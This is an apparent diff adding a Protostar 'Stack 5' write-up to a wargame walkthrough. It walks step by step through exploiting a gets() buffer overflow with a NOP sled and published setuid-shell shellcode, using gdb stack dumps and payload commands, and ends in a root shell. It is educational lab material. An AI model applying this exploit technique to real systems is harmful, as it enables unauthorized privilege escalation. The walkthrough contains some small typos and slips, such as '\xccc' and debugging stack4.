@@ -519,5 +519,177 @@ Segmentation fault
 
 We solved it :D
 
+## Stack 5
+
+### Challenge description
+
+Stack5 is a standard buffer overflow, this time introducing shellcode.
+
+This level is at `/opt/protostar/bin/stack5`
+
+Hints
+
++ At this point in time, it might be easier to use someone elses shellcode
++ If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
++ remove the int3s once your shellcode is done.
+
+### Challenge source code
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+
+### Challenge solution
+
+We dont have any function to jump to !
+what about jumping to a malicious code that will give us root privileges?
+
+Here is a breakdown of the idea :
+
+- First, we need to determine the offset, just like in the previous challenge.
+- Once we have the offset, we need an address to jump to, in thise case the address of our malicious code.
+
+There is a problem here, we cannot predict the address of our shellcode before actually loading it into the memory.
+
+How are we then going to solve this problem?
+
+Let me introduce you to the `NOP SLED`.
+
+A NOP sled (No Operation sled) is a technique used in computer security to increase the likelihood that a malicious code or exploit will execute successfully. It involves padding the front of the malicious code with a series of NOP (No Operation) instructions, which are essentially instructions that do nothing.
+
+Here is what our payload would look like :
+
+<img src="/...assets/protostar_stack0_nopsled.png" />
+
+Basically, we will provide enough NOP instructions to ensure that we land there, executing our shellcode.
+
+A NOP has an opcode of `\x90`.
+
+Now let's create a payload and determine the address that we are going to jump to.
 
 
+```bash
+user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "BBBB" . "\x90" x 100')
+
+user@protostar:/opt/protostar/bin$ echo $payload > /tmp/yariss/payload 
+```
+
+```bash
+user@protostar:/opt/protostar/bin$ gdb ./stack4
+(gdb) disass main
+Dump of assembler code for function main:
+0x08048408 <main+0>:    push   %ebp
+0x08048409 <main+1>:    mov    %esp,%ebp
+0x0804840b <main+3>:    and    $0xfffffff0,%esp
+0x0804840e <main+6>:    sub    $0x50,%esp
+0x08048411 <main+9>:    lea    0x10(%esp),%eax
+0x08048415 <main+13>:   mov    %eax,(%esp)
+0x08048418 <main+16>:   call   0x804830c <gets@plt>
+0x0804841d <main+21>:   leave  
+0x0804841e <main+22>:   ret    
+End of assembler dump.
+(gdb) b *main+21
+Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
+(gdb) run < /tmp/yariss/payload 
+
+```
+
+Let's now examine the stack.
+
+```bash
+(gdb) x/64wx $esp
+0xbffff6f0:     0xbffff700      0xb7ec6165      0xbffff708      0xb7eada75
+0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff740:     0x41414141      0x41414141      0x41414141      0x42424242
+0xbffff750:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff760:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff770:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff780:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff790:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff7a0:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbffff7b0:     0x90909090      0xb7ff6200      0xb7eadb9b      0xb7ffeff4
+0xbffff7c0:     0x00000001      0x08048340      0x00000000      0x08048361
+0xbffff7d0:     0x08048408      0x00000001      0xbffff7f4      0x08048430
+0xbffff7e0:     0x08048420      0xb7ff1040      0xbffff7ec      0xb7fff8f8
+```
+
+As you can see, `0x90909090` are the NOP instructions we provided, all we need to do is to grab an address that points to one of the NOP, let's take `0xbffff780`.
+
+Now our payload is going to be something like this :
+
+```bash
+user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "\x80\xf7\xff\xbf" . "\x90" x 100')
+```
+
+But we need some sort of code to execute after the NOP operations, let's test `\xcc` which is basically the opcode for breakpoint.
+
+```bash
+user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "\x80\xf7\xff\xbf" . "\x90" x 100 . "\xccc" x 4')
+```
+
+```bash
+user@protostar:/opt/protostar/bin$ cat /tmp/yariss/payload | ./stack5
+Trace/breakpoint trap
+```
+
+Its working !
+
+All left here is to actually provide a malicious code.
+
+Since this is a linux x86 executable, and has a SUID set, we need a shellcode that sets our real uid to the effective uid which is the root uid.
+
+Here is the famous [https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html) where you can find shellcodes :)
+
+And this is the shellcode i chose [https://shell-storm.org/shellcode/files/shellcode-399.html](https://shell-storm.org/shellcode/files/shellcode-399.html) which matches what we need.
+
+`"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"`
+
+Let's now add this shellcode to our payload.
+
+```bash
+user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "\x80\xf7\xff\xbf" . "\x90" x 100 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
+user@protostar:/opt/protostar/bin$ echo $payload > /tmp/yariss/payload 
+```
+
+Now let's execute !!
+
+```bash
+user@protostar:/opt/protostar/bin$ cat /tmp/yariss/payload | ./stack5
+user@protostar:/opt/protostar/bin$ 
+```
+
+What ?? Nothing happens ??
+
+Well actually the shell gets closed and we need to keep it open, here is a trick to do that :
+
+```bash
+user@protostar:/opt/protostar/bin$ (cat /tmp/yariss/payload ; cat ) | ./stack5
+```
+
+The program takes input from the output of our command, and when the program is done, it closes the pip.
+
+But our program executes a shell, so we need that shell to stay open so we can interact with it
+
+the solution is to group both our payload and the `cat` command as input for our stack5 program
+this way our exploit will run and execute the shell, then we can use cat to interact with our shell.
+
+```bash
+user@protostar:/opt/protostar/bin$ (cat /tmp/yariss/payload ; cat ) | ./stack5
+whoami
+root
+```
+
+Boom , we are root !!
